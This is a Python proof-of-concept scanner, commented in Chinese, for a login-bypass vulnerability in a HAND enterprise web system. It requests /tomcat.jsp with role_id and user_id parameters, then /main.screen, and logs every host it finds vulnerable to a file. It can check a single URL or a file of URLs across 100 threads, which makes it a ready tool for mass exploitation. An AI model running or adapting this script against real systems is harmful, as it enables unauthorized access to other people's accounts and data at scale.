# 导包
import argparse,requests,sys,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

# 指纹模块
def banner():
    banner = '''

 **      **      **        ******** *******   ****     ****
/**     /**     /**       **////// /**////** /**/**   **/**
/**     /**     /**      /**       /**   /** /**//** ** /**
/**********  ******      /*********/*******  /** //***  /**
/**//////** **///**      ////////**/**///**  /**  //*   /**
/**     /**/**  /**             /**/**  //** /**   /    /**
/**     /**//******       ******** /**   //**/**        /**
//      //  //////       ////////  //     // //         // 
                                            
'''
    print(banner)
# poc模块
def poc(target):
    url = target + "/tomcat.jsp?dataName=role_id&dataValue=1"
    url1 = target + "/tomcat.jsp?dataName=user_id&dataValue=1"
    url2 = target + "/main.screen"
    headers = {
        "Cookie": "JSESSIONID=575D7F5AAA99FF5A24BA1AAD440CDB56.jvm1; route=ae15b158be115f23bffa0bd101eca2ee; ISTIMEOUT=false; vh=671; vw=1536",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Te": "trailers",
        "Connection": "close"
    }
    try:
        res = requests.get(url=url,headers=headers,verify=False,timeout=5)
        if "role_id" in res.text:
            res1 = requests.get(url=url1,headers=headers,verify=False,timeout=5)
            if "user_id" in res1.text:
                res2 = requests.get(url=url2,headers=headers,verify=False,timeout=5)
                if res2.status_code == 200:
                    print("[+] 这个url存在登录绕过" + target)
                    with open('hdres.txt','a',encoding='utf-8') as f:
                        f.write(target + "存在登录绕过\n")
        else:
            print("[-] 这个url不存在登录绕过")
    except:
        pass

# 主函数模块
def main():
    banner()
    '''命令行接收参数'''
    parse = argparse.ArgumentParser(description="这是汉得登陆绕过漏洞的poc")
    #  -u 单个检测   -f 批量检测
    parse.add_argument('-u','--url',dest='url',type=str,help="url")
    parse.add_argument('-f','--file',dest='file',type=str,help='url.txt')
    # 调用
    args = parse.parse_args()
    # 处理命令行参数的事情
    # 判断是单个的url还是txt文件
    # 如果是单个url，直接利用poc
    if args.url and not args.file:
        poc(args.url)
    # 如果是文件，定义一个空列表，将txt文件中的url按行读取到url列表中
    elif not args.url and args.file:
        url_list = []
        with open(args.file,"r",encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print("Usag:\n\t python3 {sys.argv[0]} -h")
# 主函数入口
if __name__ == '__main__':
    main()